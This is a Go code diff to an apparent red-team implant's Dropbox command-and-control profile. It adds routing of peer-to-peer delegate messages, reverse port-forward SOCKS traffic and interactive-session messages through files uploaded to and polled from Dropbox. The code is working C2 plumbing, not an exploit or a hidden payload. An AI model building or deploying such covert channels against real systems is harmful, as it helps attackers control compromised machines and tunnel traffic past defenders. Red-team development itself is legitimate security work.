@@ -34,6 +34,14 @@ type DropboxProfile struct {
 	PollInterval  time.Duration
 	client        *http.Client
 	processed     map[string]struct{}
+
+	GetDelegatesOnly       func() []structs.DelegateMessage
+	GetDelegatesAndEdges   func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
+	HandleDelegates        func(delegates []structs.DelegateMessage)
+	GetRpfwdOutbound       func() []structs.SocksMsg
+	HandleRpfwd            func(msgs []structs.SocksMsg)
+	GetInteractiveOutbound func() []structs.InteractiveMsg
+	HandleInteractive      func(msgs []structs.InteractiveMsg)
 }
 
 type listFolderResp struct {
@@ -80,6 +88,21 @@ func (d *DropboxProfile) Checkin(agent *structs.Agent) error {
 
 func (d *DropboxProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
 	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: d.getActiveUUID(agent), PayloadType: "killa", C2Profile: "dropbox"}
+	if d.GetDelegatesOnly != nil {
+		if delegates := d.GetDelegatesOnly(); len(delegates) > 0 {
+			msg.Delegates = delegates
+		}
+	}
+	if d.GetRpfwdOutbound != nil {
+		if rpfwdMsgs := d.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
+			msg.Rpfwd = rpfwdMsgs
+		}
+	}
+	if d.GetInteractiveOutbound != nil {
+		if interactiveMsgs := d.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
+			msg.Interactive = interactiveMsgs
+		}
+	}
 	resp, err := d.sendAndPoll(d.getActiveUUID(agent), msg, 10*time.Second)
 	if err != nil {
 		return nil, nil, fmt.Errorf("dropbox get_tasking send/poll failed: %w", err)
@@ -102,12 +125,40 @@ func (d *DropboxProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 			_ = json.Unmarshal(socksRaw, &inboundSocks)
 		}
 	}
+	d.routeInboundMessages(m)
 	return tasks, inboundSocks, nil
 }
 
 func (d *DropboxProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
 	msg := structs.PostResponseMessage{Action: "post_response", Responses: []structs.Response{response}, Socks: socks}
-	return d.sendAndPoll(d.getActiveUUID(agent), msg, 5*time.Second)
+	if d.GetRpfwdOutbound != nil {
+		if rpfwdMsgs := d.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
+			msg.Rpfwd = rpfwdMsgs
+		}
+	}
+	if d.GetDelegatesAndEdges != nil {
+		delegates, edges := d.GetDelegatesAndEdges()
+		if len(delegates) > 0 {
+			msg.Delegates = delegates
+		}
+		if len(edges) > 0 {
+			msg.Edges = edges
+		}
+	}
+	if d.GetInteractiveOutbound != nil {
+		if interactiveMsgs := d.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
+			msg.Interactive = interactiveMsgs
+		}
+	}
+	resp, err := d.sendAndPoll(d.getActiveUUID(agent), msg, 5*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	var parsed map[string]any
+	if err := json.Unmarshal(resp, &parsed); err == nil {
+		d.routeInboundMessages(parsed)
+	}
+	return resp, nil
 }
 
 func (d *DropboxProfile) GetCallbackUUID() string { return d.CallbackUUID }
@@ -121,7 +172,7 @@ func (d *DropboxProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Du
 	if err != nil {
 		return nil, err
 	}
-	name := fmt.Sprintf("%d-%s.txt", time.Now().UnixNano(), getStringAny(msg, "Action"))
+	name := fmt.Sprintf("%d-%s.txt", time.Now().UnixNano(), getMessageAction(msg))
 	if err := d.uploadText(path.Join(d.ResultFolder, name), payload); err != nil {
 		return nil, err
 	}
@@ -177,6 +228,39 @@ func (d *DropboxProfile) getActiveUUID(agent *structs.Agent) string {
 		return d.CallbackUUID
 	}
 	return agent.PayloadUUID
+}
+
+func (d *DropboxProfile) routeInboundMessages(m map[string]any) {
+	if d.HandleRpfwd != nil {
+		if rpfwdList, exists := m["rpfwd"]; exists {
+			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+				var rpfwdMsgs []structs.SocksMsg
+				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+					d.HandleRpfwd(rpfwdMsgs)
+				}
+			}
+		}
+	}
+	if d.HandleInteractive != nil {
+		if interactiveList, exists := m["interactive"]; exists {
+			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
+				var interactiveMsgs []structs.InteractiveMsg
+				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
+					d.HandleInteractive(interactiveMsgs)
+				}
+			}
+		}
+	}
+	if d.HandleDelegates != nil {
+		if delegateList, exists := m["delegates"]; exists {
+			if delegateRaw, err := json.Marshal(delegateList); err == nil {
+				var delegates []structs.DelegateMessage
+				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+					d.HandleDelegates(delegates)
+				}
+			}
+		}
+	}
 }
 
 func (d *DropboxProfile) uploadText(remotePath, content string) error {
@@ -395,9 +479,20 @@ func getString(m map[string]any, key string) string {
 	return ""
 }
 
-func getStringAny(v any, fallback string) string {
-	if v == nil {
-		return fallback
+func getMessageAction(v any) string {
+	switch msg := v.(type) {
+	case structs.CheckinMessage:
+		if msg.Action != "" {
+			return msg.Action
+		}
+	case structs.TaskingMessage:
+		if msg.Action != "" {
+			return msg.Action
+		}
+	case structs.PostResponseMessage:
+		if msg.Action != "" {
+			return msg.Action
+		}
 	}
-	return fallback
+	return "message"
 }
